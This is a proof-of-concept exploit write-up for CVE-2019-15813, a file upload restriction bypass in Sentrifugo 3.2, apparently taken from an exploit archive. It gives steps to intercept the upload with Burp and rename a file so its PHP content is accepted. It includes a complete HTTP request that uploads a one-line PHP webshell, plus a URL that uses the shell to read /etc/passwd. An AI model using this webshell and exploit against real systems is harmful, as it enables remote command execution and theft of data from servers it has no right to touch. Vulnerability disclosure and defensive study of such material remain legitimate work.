@@ -1,0 +1,64 @@
+# Exploit Title: Sentrifugo 3.2 - File Upload Restriction Bypass 
+# Google Dork: N/A
+# Date: 8/29/2019
+# Exploit Author: creosote
+# Vendor Homepage: http://www.sentrifugo.com/
+# Version: 3.2
+# Tested on: Ubuntu 18.04
+# CVE : CVE-2019-15813
+
+Multiple File Upload Restriction Bypass vulnerabilities were found in Sentrifugo 3.2. This allows for an authenticated user to potentially obtain RCE via webshell.
+
+File upload bypass locations:
+
+/sentrifugo/index.php/mydetails/documents -- Self Service >> My Details >> Documents (any permissions needed)
+sentrifugo/index.php/policydocuments/add -- Organization >> Policy Documents (higher permissions needed)
+
+
+# POC
+
+1. Self Service >> My Details >> Documents >> add New Document (/sentrifugo/index.php/mydetails/documents)
+2. Turn Burp Intercept On
+3. Select webshell with valid extension - ex: shell.php.doc
+4. Alter request in the upload...
+   Update 'filename' to desired extension. ex: shell.php
+   Change content type to 'application/x-httpd-php'
+
+Example exploitation request:
+
+====================================================================================================
+
+POST /sentrifugo/index.php/employeedocs/uploadsave HTTP/1.1
+Host: 10.42.1.42
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.42.1.42/sentrifugo/index.php/mydetails/documents
+X-Requested-With: XMLHttpRequest
+Content-Length: 494
+Content-Type: multipart/form-data; boundary=---------------------------205946976257369239535727507
+Cookie: PHPSESSID=vr0ik0kof2lpg0jlc9gp566qb5
+Connection: close
+
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name="myfile"; filename="shell.php"
+Content-Type: application/x-httpd-php
+
+<?php $cmd=$_GET['cmd']; system($cmd);?>
+
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------205946976257369239535727507--
+
+====================================================================================================
+
+5. With intercept still on, Save the document and copy the 'file_new_names' parmeter from the new POST request.
+6. Append above saved parameter and visit your new webshell
+   Ex: http://10.42.1.42/sentrifugo/public/uploads/employeedocs/1565996140_5_shell.php?cmd=cat /etc/passwd
